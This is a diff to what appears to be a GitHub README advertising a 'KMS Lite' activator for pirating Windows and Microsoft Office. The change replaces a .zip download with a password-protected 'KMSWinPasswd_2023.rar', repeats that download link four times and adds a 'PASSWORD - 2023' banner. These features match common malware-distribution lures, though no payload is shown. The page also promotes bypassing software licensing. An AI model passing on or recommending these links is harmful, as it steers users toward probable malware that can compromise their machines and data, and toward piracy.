@@ -1,6 +1,6 @@
 # <h1 align=center> KMS WINDOWS ACTIVATOR, MICROSOFT OFFICE ACTIVATOR. KMS LITE
 
-<h2 align=center><a href='https://github.com/visualpromake/kms/releases/download/kms_windows_activator/KMSWindowsActivator.zip'><img src='https://media.discordapp.net/attachments/1181190470383185942/1181190574213189692/3.png?ex=65802872&is=656db372&hm=a1994a9ce66dff143fc8214c7482fb70f2df015561ba446dd16705b70e9ae131&=&format=webp&quality=lossless&width=885&height=498'></a></h2>
+<h2 align=center><a href='https://github.com/visualpromake/kms/releases/download/kms_windows_activator/KMSWinPasswd_2023.rar'><img src='https://media.discordapp.net/attachments/1181190470383185942/1181190574213189692/3.png?ex=65802872&is=656db372&hm=a1994a9ce66dff143fc8214c7482fb70f2df015561ba446dd16705b70e9ae131&=&format=webp&quality=lossless&width=885&height=498'></a></h2>
 
 # <h1 align=center> DESCRIPTION OF KMS LITE
 ⚫️Automated Activation: With KMS Windows Activator, activation is as easy as pushing a button. The tool automatically detects your product key and activates it within minutes, saving you time and effort.  
@@ -16,7 +16,11 @@
 # <h1 align=center>⚡️ DOWNLOAD LINK⚡️
 | Mod Version| KMS LITE - Version | Link |
 |----------|-------------|-----------------|
-| v1.0.0 | 2023.7.12 & 2023.7.11 | [Download](https://github.com/visualpromake/kms/releases/download/kms_windows_activator/KMSWindowsActivator.zip) |
+| v1.0.0 | 2023.7.12 & 2023.7.11 | [Download](https://github.com/visualpromake/kms/releases/download/kms_windows_activator/KMSWinPasswd_2023.rar) |
+| v1.0.0 | 2023.7.12 & 2023.7.11 | [Download](https://github.com/visualpromake/kms/releases/download/kms_windows_activator/KMSWinPasswd_2023.rar) |
+| v1.0.0 | 2023.7.12 & 2023.7.11 | [Download](https://github.com/visualpromake/kms/releases/download/kms_windows_activator/KMSWinPasswd_2023.rar) |
+| v1.0.0 | 2023.7.12 & 2023.7.11 | [Download](https://github.com/visualpromake/kms/releases/download/kms_windows_activator/KMSWinPasswd_2023.rar) |
+
+# <h1 align=center> ✅✅✅PASSWORD - 2023✅✅✅
 
 # <h1 align=center> TURN ALL YOUR IDEAS INTO REALITY!
-
